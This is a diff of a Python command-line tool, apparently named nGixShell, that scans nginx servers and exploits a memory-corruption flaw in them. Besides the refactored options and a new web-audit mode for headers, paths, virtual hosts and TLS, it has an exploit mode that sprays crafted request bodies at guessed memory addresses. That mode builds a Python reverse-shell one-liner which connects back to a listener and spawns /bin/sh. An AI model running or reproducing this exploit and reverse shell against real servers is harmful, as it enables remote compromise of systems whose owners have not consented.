+    wa = parser.add_argument_group("web audit (auto-enabled in scan mode)")
+    wa.add_argument("--skip-headers",  action="store_true", help="skip HTTP header security audit")
+    wa.add_argument("--skip-paths",    action="store_true", help="skip path discovery")
+    wa.add_argument("--skip-vhosts",   action="store_true", help="skip virtual host enumeration")
+    wa.add_argument("--skip-tls",      action="store_true", help="skip TLS audit")
+    wa.add_argument("--path-wordlist", metavar="FILE",      help="extra paths for path discovery")
 
-    # ── HTTP options ──────────────────────────────────────────────────────────
-    http = parser.add_argument_group("http")
-    http.add_argument("--user-agent", metavar="UA", default="nGixShell/1.0")
-    http.add_argument("--auth",       metavar="USER:PASS",
-                      help="HTTP Basic auth")
-    http.add_argument("--cookie",     metavar="VALUE")
-    http.add_argument("--header",     metavar="NAME:VALUE", action="append", default=[],
-                      help="extra header (repeatable)")
+    # ── Connection ────────────────────────────────────────────────────────────
+    cn = parser.add_argument_group("connection")
+    cn.add_argument("--port",  type=int, default=None, help="override port")
+    cn.add_argument("--tls",   action="store_true",    help="force TLS (auto-detected by default)")
+    cn.add_argument("--proxy", metavar="URL",          help="http://, https://, socks5://")
+
+    # ── HTTP ──────────────────────────────────────────────────────────────────
+    ht = parser.add_argument_group("http")
+    ht.add_argument("--user-agent", metavar="UA", default="nGixShell/1.0")
+    ht.add_argument("--auth",       metavar="USER:PASS", help="HTTP Basic auth")
+    ht.add_argument("--cookie",     metavar="VALUE")
+    ht.add_argument("--header",     metavar="NAME:VALUE", action="append", default=[],
+                    help="extra header (repeatable)")
 
     # ── Rate / timing ─────────────────────────────────────────────────────────
-    rate = parser.add_argument_group("rate / timing")
-    rate.add_argument("--jitter",     type=float, default=0.0, metavar="MS",
-                      help="random delay 0–MS ms between requests")
-    rate.add_argument("--rate-limit", type=float, default=0.0, metavar="RPS",
-                      help="max requests/sec (0 = unlimited)")
-    rate.add_argument("--retry",      type=int,   default=1,
-                      help="probe retries on inconclusive result (default: 1)")
-    rate.add_argument("--timeout-multiplier", type=float, default=1.0, metavar="X",
-                      help="scale all sleep timings (default: 1.0)")
+    rt = parser.add_argument_group("rate / timing")
+    rt.add_argument("--jitter",     type=float, default=0.0, metavar="MS")
+    rt.add_argument("--rate-limit", type=float, default=0.0, metavar="RPS")
+    rt.add_argument("--retry",      type=int,   default=1)
+    rt.add_argument("--timeout-multiplier", type=float, default=1.0, metavar="X")
 
     # ── Reverse shell ─────────────────────────────────────────────────────────
-    rsh = parser.add_argument_group("reverse shell")
-    rsh.add_argument("--listen-port", type=int, default=1337)
-    rsh.add_argument("--listen-ip",   default="172.17.0.1")
+    rs = parser.add_argument_group("reverse shell")
+    rs.add_argument("--listen-port", type=int, default=1337)
+    rs.add_argument("--listen-ip",   default="172.17.0.1")
 
     # ── Exploit tuning ────────────────────────────────────────────────────────
-    tuning = parser.add_argument_group("exploit tuning")
-    tuning.add_argument("--tries",    type=int,   default=10)
-    tuning.add_argument("--spray",    type=int,   default=20)
-    tuning.add_argument("--body-len", type=int,   default=4000)
+    tu = parser.add_argument_group("exploit tuning")
+    tu.add_argument("--tries",    type=int, default=10)
+    tu.add_argument("--spray",    type=int, default=20)
+    tu.add_argument("--body-len", type=int, default=4000)
 
     # ── Subdomain scan ────────────────────────────────────────────────────────
     sd = parser.add_argument_group("subdomain scan")
@@ -1131,23 +1628,19 @@ Usage examples
     sd.add_argument("--scan-timeout", type=float, default=5.0)
 
     # ── Output ────────────────────────────────────────────────────────────────
-    out = parser.add_argument_group("output")
-    out.add_argument("--output",      metavar="FILE",
-                     help="write log to FILE in addition to stdout")
-    out.add_argument("--json",        action="store_true",
-                     help="print JSON summary")
-    out.add_argument("--html-report", metavar="FILE", nargs="?",
-                     const="ngixshell_report.html",
-                     help="save HTML report (default: ngixshell_report.html)")
-    out.add_argument("--no-report",   action="store_true",
-                     help="skip the auto HTML report in auto mode")
-    out.add_argument("--verbose",     action="store_true")
+    ou = parser.add_argument_group("output")
+    ou.add_argument("--output",      metavar="FILE", help="write log to FILE")
+    ou.add_argument("--json",        action="store_true", help="print JSON summary")
+    ou.add_argument("--html-report", metavar="FILE", nargs="?",
+                    const="ngixshell_report.html",
+                    help="save HTML report (default: ngixshell_report.html)")
+    ou.add_argument("--no-report",   action="store_true",
+                    help="skip auto HTML report")
+    ou.add_argument("--verbose",     action="store_true")
 
     args = parser.parse_args()
-
     print(BANNER)
 
-    # Quick-exit modes that need no target
     if args.list_cves:
         list_cves()
         return 0
@@ -1155,7 +1648,6 @@ Usage examples
         list_candidates()
         return 0
 
-    # Validate --cve
     if args.cve and args.cve not in CVE_DB:
         parser.error(f"Unknown CVE '{args.cve}'. Use --list-cves to see IDs.")
 
@@ -1178,23 +1670,26 @@ Usage examples
     if args.output:
         _log_fh = open(args.output, "w", encoding="utf-8")
 
+    # Extra path wordlist
+    extra_paths = []
+    if args.path_wordlist:
+        with open(args.path_wordlist) as f:
+            extra_paths = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+
     start = time.monotonic()
 
     try:
-        # ── Subdomain scan (no single target needed) ──────────────────────────
+        # ── Subdomain scan ────────────────────────────────────────────────────
         if args.subdomain_scan:
+            wl = COMMON_SUBDOMAINS
             if args.wordlist:
                 with open(args.wordlist) as f:
-                    wordlist = [l.strip() for l in f if l.strip()]
-            else:
-                wordlist = COMMON_SUBDOMAINS
-            subdomain_scan(args.subdomain_scan, wordlist,
-                           port=args.scan_port, tls=args.scan_tls,
-                           proxy=args.proxy, n_threads=args.scan_threads,
-                           timeout=args.scan_timeout)
+                    wl = [l.strip() for l in f if l.strip()]
+            subdomain_scan(args.subdomain_scan, wl, port=args.scan_port, tls=args.scan_tls,
+                           proxy=args.proxy, n_threads=args.scan_threads, timeout=args.scan_timeout)
             return 0
 
-        # ── Build target list ──────────────────────────────────────────────────
+        # ── Build target list ─────────────────────────────────────────────────
         raw_targets = []
         if args.target_file:
             with open(args.target_file) as f:
@@ -1214,34 +1709,31 @@ Usage examples
 
         all_findings     = []
         all_fingerprints = []
+        all_web_audits   = []
 
         for t_host, t_port, tls_forced in raw_targets:
             if len(raw_targets) > 1:
                 log(f"\n{'━'*60}  {t_host}:{t_port}  {'━'*60}")
 
-            # TLS resolution order: explicit --tls > scheme (https://) > auto-detect
             use_tls = args.tls or tls_forced
             if not use_tls:
                 log(f"[*] Auto-detecting TLS for {t_host}:{t_port} ...")
                 use_tls = _auto_detect_tls(t_host, t_port, args.proxy)
                 log(f"[*] TLS: {'yes' if use_tls else 'no'}")
 
-            # ── Exploit modes ─────────────────────────────────────────────────
-            exploit_mode = args.cmd or args.cmd_file or args.shell
-            if exploit_mode and not args.dry_run:
+            # ── Exploit mode ──────────────────────────────────────────────────
+            if (args.cmd or args.cmd_file or args.shell) and not args.dry_run:
                 if args.cmd_file:
                     with open(args.cmd_file) as f:
                         cmds = [l.strip() for l in f if l.strip()]
                     cmd = "; ".join(cmds)
                     log(f"[*] Loaded {len(cmds)} commands from {args.cmd_file}")
                 elif args.shell:
-                    cmd = (
-                        f"python3 -c 'import socket,subprocess,os;"
-                        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-                        f"s.connect((\"{args.listen_ip}\",{args.listen_port}));"
-                        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-                        f"subprocess.call([\"/bin/sh\",\"-i\"])'"
-                    )
+                    cmd = (f"python3 -c 'import socket,subprocess,os;"
+                           f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                           f"s.connect((\"{args.listen_ip}\",{args.listen_port}));"
+                           f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+                           f"subprocess.call([\"/bin/sh\",\"-i\"])'")
                 else:
                     cmd = args.cmd
 
@@ -1257,10 +1749,9 @@ Usage examples
                 log(f"[*] {len(candidates)} safe candidates")
 
                 primary_addr = candidates[0][1]
-                data_addr    = primary_addr + FAKE_STRUCT_SIZE
-                body         = make_body(cmd, data_addr, args.body_len)
+                body         = make_body(cmd, primary_addr + FAKE_STRUCT_SIZE, args.body_len)
 
-                log(f"[*] Waiting for nginx ...")
+                log("[*] Waiting for nginx ...")
                 if not wait_alive(t_host, t_port, tls=use_tls, proxy=args.proxy):
                     log("[!] nginx not responding")
                     return 1
@@ -1274,13 +1765,10 @@ Usage examples
                     candidates_tried += 1
                     for an in range(args.tries):
                         total_attempts += 1
-                        log(f"  [cand {ci+1}/{len(candidates)}] [try {an+1}/{args.tries}] "
-                            f"0x{addr:012x}")
-                        if not wait_alive(t_host, t_port, timeout=10,
-                                          tls=use_tls, proxy=args.proxy):
+                        log(f"  [cand {ci+1}/{len(candidates)}] [try {an+1}/{args.tries}] 0x{addr:012x}")
+                        if not wait_alive(t_host, t_port, timeout=10, tls=use_tls, proxy=args.proxy):
                             _sleep(2)
-                            if not wait_alive(t_host, t_port, timeout=10,
-                                              tls=use_tls, proxy=args.proxy):
+                            if not wait_alive(t_host, t_port, timeout=10, tls=use_tls, proxy=args.proxy):
                                 log("    server not recovering, aborting")
                                 return 1
                         if attempt(t_host, t_port, target_b, body,
@@ -1306,48 +1794,96 @@ Usage examples
                     log("[+] All candidates tried — no crash detected.")
 
                 elapsed = time.monotonic() - start
-                log("")
-                log("═" * 60)
-                log("  EXPLOIT REPORT")
-                log("═" * 60)
-                log(f"  Target   : {t_host}:{t_port}")
-                log(f"  Command  : {cmd}")
-                log(f"  Result   : {'SUCCESS' if success else 'FAILURE'}")
-                log(f"  Elapsed  : {elapsed:.1f}s")
+                log(f"\n{'═'*60}\n  EXPLOIT REPORT\n{'═'*60}")
+                log(f"  Target  : {t_host}:{t_port}")
+                log(f"  Command : {cmd}")
+                log(f"  Result  : {'SUCCESS' if success else 'FAILURE'}")
+                log(f"  Elapsed : {elapsed:.1f}s")
                 if winner_addr:
-                    log(f"  Address  : 0x{winner_addr:012x}  (try {winner_try})")
+                    log(f"  Address : 0x{winner_addr:012x}  (try {winner_try})")
                 log("═" * 60)
                 return 0 if success else 1
 
             # ── Auto / scan mode ──────────────────────────────────────────────
-            fp       = fingerprint_target(t_host, t_port, use_tls, args.proxy)
-            version  = fp.get("version_tuple")
+            fp      = fingerprint_target(t_host, t_port, use_tls, args.proxy)
+            version = fp.get("version_tuple")
             findings = cve_scan(t_host, t_port, use_tls, args.proxy,
                                 target_cve=args.cve if args.cve else None,
                                 version=version)
 
+            # ── Web audit ─────────────────────────────────────────────────────
+            web_audit = {}
+
+            if not args.skip_headers:
+                web_audit["header_issues"] = audit_headers(
+                    t_host, t_port, use_tls, args.proxy)
+
+            if not args.skip_paths:
+                web_audit["paths_found"] = path_discovery(
+                    t_host, t_port, use_tls, args.proxy, extra_paths)
+                # Parse stub_status if found in paths
+                stub_entry = next(
+                    (p for p in web_audit["paths_found"]
+                     if p["path"] in ("/nginx_status", "/nginx-status") and p["status"] == 200),
+                    None
+                )
+                if stub_entry and stub_entry.get("body_preview"):
+                    text = stub_entry["body_preview"]
+                    stub = {}
+                    m = re.search(r"Active connections:\s*(\d+)", text)
+                    if m: stub["active_connections"] = int(m.group(1))
+                    m = re.search(r"(\d+)\s+(\d+)\s+(\d+)", text)
+                    if m:
+                        stub["accepts"]  = int(m.group(1))
+                        stub["handled"]  = int(m.group(2))
+                        stub["requests"] = int(m.group(3))
+                    m = re.search(r"Reading:\s*(\d+)\s+Writing:\s*(\d+)\s+Waiting:\s*(\d+)", text)
+                    if m:
+                        stub["reading"] = int(m.group(1))
+                        stub["writing"] = int(m.group(2))
+                        stub["waiting"] = int(m.group(3))
+                    web_audit["stub_status"] = stub
+                else:
+                    web_audit["stub_status"] = {}
+
+            if not args.skip_vhosts:
+                web_audit["vhosts_found"] = vhost_enum(
+                    t_host, t_port, use_tls, args.proxy)
+
+            if not args.skip_tls and use_tls:
+                web_audit["tls_result"] = tls_audit(t_host, t_port, args.proxy)
+            else:
+                web_audit["tls_result"] = {}
+
             all_findings.extend(findings)
             all_fingerprints.append(fp)
+            all_web_audits.append(web_audit)
 
         # ── Post-loop output ──────────────────────────────────────────────────
         elapsed = time.monotonic() - start
         h0, p0  = raw_targets[0][0], raw_targets[0][1]
         fp0     = all_fingerprints[0] if all_fingerprints else None
+        wa0     = all_web_audits[0]   if all_web_audits   else None
 
         if args.json:
-            obj = _build_json_output(h0, p0, all_findings, fp0, elapsed)
+            obj = _build_json_output(h0, p0, all_findings, fp0, wa0, elapsed)
             if len(raw_targets) > 1:
                 obj["all_targets"] = [{"host": h, "port": p} for h, p, _ in raw_targets]
             print(json.dumps(obj, indent=2, ensure_ascii=False))
 
-        # Auto HTML report when findings exist (unless --no-report)
+        # Auto HTML report
+        has_issues = bool(all_findings or
+                          (wa0 and (wa0.get("header_issues") or
+                                    wa0.get("paths_found") or
+                                    wa0.get("vhosts_found") or
+                                    wa0.get("tls_result", {}).get("issues"))))
         html_path = args.html_report
-        if not html_path and not args.no_report and all_findings:
+        if not html_path and not args.no_report and has_issues:
             ts        = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
             html_path = f"ngixshell_{h0}_{ts}.html"
 
         if html_path:
-            generate_html_report(h0, p0, all_findings, fp0, elapsed, html_path)
+            generate_html_report(h0, p0, all_findings, fp0, wa0, elapsed, html_path)
 
         return 0 if not all_findings else 1
 
